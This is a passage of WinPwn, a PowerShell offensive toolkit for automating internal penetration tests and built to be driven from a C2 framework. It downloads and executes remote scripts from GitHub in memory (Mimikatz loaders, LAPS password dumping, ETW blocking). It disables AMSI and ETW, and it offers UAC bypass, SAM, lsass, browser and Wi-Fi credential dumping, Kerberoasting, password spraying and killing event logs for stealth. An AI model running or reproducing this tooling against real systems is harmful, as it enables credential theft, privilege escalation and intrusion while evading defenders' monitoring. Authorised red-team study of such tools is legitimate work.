                                                        $_.ConvertToDateTime($_.LastAccessed)
                                                    }
                                            } else {
                                                $HashProperty.LastAccessTime = $null
                                            }
                                        }
                                        
                                        if ($psversiontable.psversion.major -gt 2) {
                                            [pscustomobject]$HashProperty
                                        } else {
                                            New-Object -TypeName PSCustomObject -Property $HashProperty |
                                            Select-Object -Property $SelectProperty
                                        }
                                    }
                                    $socket.Close()
                                }

                            }

                        }

                    }
                }
            } catch {
                Write-Error $_
            }
        }
    }
}

function Lapschecks
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $passworddump   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    if ($passworddump)
    {
        IEX ($viewdevobfs)
        if(!$consoleoutput){breviaries -Properties DnsHostName,ms-Mcs-AdmPwd >> "$currentPath\Exploitation\LapsPasswords.txt"}else{Write "-------> Dumping LAPS passwords:";breviaries -Properties DnsHostName,ms-Mcs-AdmPwd}
    }

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/LAPSToolkit.ps1')
    Write-Host "Checking for LAPS enabled Computers."
    if(!$consoleoutput){Get-LAPSComputers >> "$currentPath\DomainRecon\LapsInformations.txt"}else{Write "-------> LAPS Computers:";Get-LAPSComputers}
    Write-Host "Checking for LAPS Administrator groups."
    if(!$consoleoutput){Find-LAPSDelegatedGroups >> "$currentPath\DomainRecon\LapsAllowedAdminGroups.txt"}else{Write "-------> LAPS Groups:";Find-LAPSDelegatedGroups}
    Write-Host "Checking for special right users with access to laps passwords."
    if(!$consoleoutput){Find-AdmPwdExtendedRights >> "$currentPath\DomainRecon\LapsSpecialRights.txt"}else{Write "-------> LAPS ADM Extended Rights:";Find-AdmPwdExtendedRights}
}

function fruit
{
   $network = Read-Host -Prompt 'Please enter the CIDR for the network: (example: 192.168.0.0/24)'
   Write-Host -ForegroundColor Yellow 'Searching...'
   iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Find-Fruit.ps1')
   Find-Fruit -FoundOnly -Rhosts $network
   pause;    
}

function Mimiload
{
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/loadmimi.ps1')
	mimiload
}

function BlockEtw
{
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-BlockETW.ps1')
	Invoke-BlockETW
}
    
function WinPwn
{
    <#
        .DESCRIPTION
        Main Function. Executes the other functions according to the users input.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
         [CmdletBinding()]
    Param (
		[alias("help")][Switch]$h,
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $Domainrecon,
        [Switch]
        $Localrecon,
        [Switch]
        $Privesc,
        [Switch]
        $PowerSharpPack,
        [Switch]
        $Uacbypass,
        [string]
        $command,
        [string]
        $technique,
        [switch]
        $credentialmanager,
        [switch]
        $mimikittie,
        [switch]
        $rundll32lsass,
        [switch]
        $lazagne,
        [switch]
        $browsercredentials,
        [switch]
        $mimikittenz,
        [switch]
        $wificredentials,
        [switch]
        $samdump,
        [switch]
        $sharpcloud   
    )
   
@'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> Automate some internal Penetrationtest processes

'@

	$Help = "


Usage:



WinPwn without any parameters is meant to be used in an interactive shell. There is a guided menu - no need for explanations.

However you can pass several parameters to use it from your favorite C2-Framework. 

  -noninteractive 	-> No questions for functions so that they run with predefined or user defined parameters  
            
  -consoleoutput    -> The loot/report folders are not created. Every function returns the output to the console so that you can take a look at everything in the Agent logs of your C2-Framework 



Examples:



WinPwn -noninteractive -consoleoutput -DomainRecon 		-> This will return every single domain recon script and function and will probably give you really much output

WinPwn -noninteractive -consoleoutput -Localrecon 		-> This will enumerate as much information for the local system as possible
														   
Generalrecon -noninteractive							-> Execute basic local recon functions and store the output in the corresponding folders

UACBypass -noninteractive -command 'C:\temp\stager.exe' -technique ccmstp	-> Execute a stager in  a high integrity process from a low privileged session
Kittielocal -noninteractive -consoleoutput -browsercredentials				-> Dump Browser-Credentials via Sharpweb returning the output to console
Kittielocal -noninteractive -browsercredentials								-> Dump SAM File NTLM-Hashes and store the output in a file
WinPwn -PowerSharpPack -consoleoutput -noninteractive					    -> Execute Seatbelt, PowerUp, Watson and more C# binaries in memory
"
	if($h){return $Help}
	
    if(!$consoleoutput)
    {
        dependencychecks
        pathcheck
    }
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    AmsiBypass
    BlockEtw
    if ($noninteractive)
    {
        if ($Domainrecon)
        {
            if(!$consoleoutput){domainreconmodules -noninteractive}else{domainreconmodules -noninteractive -consoleoutput}
        }
        if ($Localrecon)
        {
            if(!$consoleoutput){localreconmodules -noninteractive}else{localreconmodules -noninteractive -consoleoutput}
        }
        if ($Privesc)
        {
            if(!$consoleoutput){privescmodules -noninteractive}else{privescmodules -noninteractive -consoleoutput}
        }
        if ($PowerSharpPack)
        {
            if(!$consoleoutput){sharpcradle -allthosedotnet -noninteractive}else{sharpcradle -allthosedotnet -noninteractive -consoleoutput}
        }
        if ($Uacbypass)
        {
            if ("ccmstp", "DiskCleanup", "magic" -notcontains $technique)
            {
                Write-Host "Invalid technique, choose from ccmstp DiskCleanup or magic"
                return
            }
            UACBypass -noninteractive -command $command -technique $technique
        }
        if ($credentialmanager)
        {
            if(!$consoleoutput){kittielocal -noninteractive -credentialmanager}else{kittielocal -noninteractive -credentialmanager -consoleoutput}
        }
        if($mimikittie)
        {
            if(!$consoleoutput){kittielocal -noninteractive -mimikittie}else{kittielocal -noninteractive -mimikittie -consoleoutput}
        }
        if($rundll32lsass)
        {
            if(!$consoleoutput){kittielocal -noninteractive -rundll32lsass}else{kittielocal -noninteractive -rundll32lsass -consoleoutput}
        }
        if($lazagne)
        {
            if(!$consoleoutput){kittielocal -noninteractive -lazagne}else{kittielocal -noninteractive -lazagne -consoleoutput}
        }
        if($browsercredentials)
        {
            if(!$consoleoutput){kittielocal -noninteractive -browsercredentials}else{kittielocal -noninteractive -browsercredentials -consoleoutput}
        }
        if($mimikittenz)
        {
            if(!$consoleoutput){kittielocal -noninteractive -mimikittenz}else{kittielocal -noninteractive -mimikittenz -consoleoutput}
        }
        if($wificredentials)
        {
            if(!$consoleoutput){kittielocal -noninteractive -wificredentials}else{kittielocal -noninteractive -wificredentials -consoleoutput}
        }
        if ($samdump)
        {
            if(!$consoleoutput){kittielocal -noninteractive -samdump}else{kittielocal -noninteractive -samdump -consoleoutput}
        }
        if ($sharpcloud)
        {
            if(!$consoleoutput){kittielocal -noninteractive -sharpcloud}else{kittielocal -noninteractive -sharpcloud -consoleoutput}
        } 
        return;
    }

    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Execute Inveigh - ADIDNS/LLMNR/mDNS/NBNS spoofer! '
        Write-Host -ForegroundColor Green '2. Local recon menu! '
        Write-Host -ForegroundColor Green '3. Domain recon menu! '
        Write-Host -ForegroundColor Green '4. Local privilege escalation check menu! '
        Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows vulnerabilities! '
	    Write-Host -ForegroundColor Green '6. Bypass UAC! '
	    Write-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '
        Write-Host -ForegroundColor Green '8. Kerberoasting! '
        Write-Host -ForegroundColor Green '9. Loot local Credentials! '
        Write-Host -ForegroundColor Green '10. Create an ADIDNS node or remove it! '
        Write-Host -ForegroundColor Green '11. Sessiongopher! '
        Write-Host -ForegroundColor Green '12. Kill the event log services for stealth! '
	    Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
	    Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
	    Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
	    Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
        Write-Host -ForegroundColor Green '17. Exit. '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
             1{Inveigh}
             2{localreconmodules}
             3{domainreconmodules}
             4{privescmodules}
             5{kernelexploits}
	         6{UACBypass}
	         7{SYSTEMShell}
             8{kerberoasting}
             9{kittielocal}
             10{adidnsmenu}
             11{sessionGopher}
            12{inv-phantom}
            13{sharpcradle -allthosedotnet}
	        14{sharpcradle -web}
            15{domainpassspray}
	        16{mimiload}
        
    }
    }
 While ($masterquestion -ne 17)
     
   
}

$Certify = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1')
$SystemDirectoryServicesProtocols = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/SystemDirectoryServicesProtocols-Import.ps1')
$viewdevobfs = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
$admodule = (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')
